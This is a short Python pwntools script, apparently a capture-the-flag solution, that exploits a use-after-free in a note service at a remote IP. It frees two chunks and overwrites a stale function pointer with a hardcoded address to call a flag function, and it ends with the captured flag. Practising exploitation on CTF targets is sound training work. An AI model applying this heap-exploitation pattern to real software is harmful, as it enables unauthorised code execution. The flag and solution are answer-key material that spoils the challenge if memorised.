#!/usr/bin/env python

from pwn import *

# Use After Free

class Expolit:
    def __init__(self, connection):
        self.sendline = connection.sendline
        self.recvuntil = connection.recvuntil
        self.recv = connection.recv

    def add(self, content):
        self.recvuntil("Your choice: ")
        self.sendline("1")
        self.recvuntil("Data size: ")
        self.sendline(str(len(content)))
        self.recvuntil("Data: ")
        self.sendline(content)

    def delete(self, idx):
        self.recvuntil("Your choice: ")
        self.sendline("2")
        self.recvuntil("Feedback index: ")
        self.sendline(str(idx))




#conn = process("./vuln")
conn = remote('3.134.118.17', 8083)

vuln = Expolit(conn)

vuln.add('A'*32)
vuln.add('B'*32)
vuln.delete(0)
vuln.delete(1)

# - Ты что, просто скопировал адрес из гидры?
# - *встаёт в профиль* Да.
flag_func = 0x004015b9
vuln.add(p64(flag_func))

# теперь просто выведи note 0

conn.interactive()

# CTF{pl34Z3_n4LL_P01n73r5_4S4p}
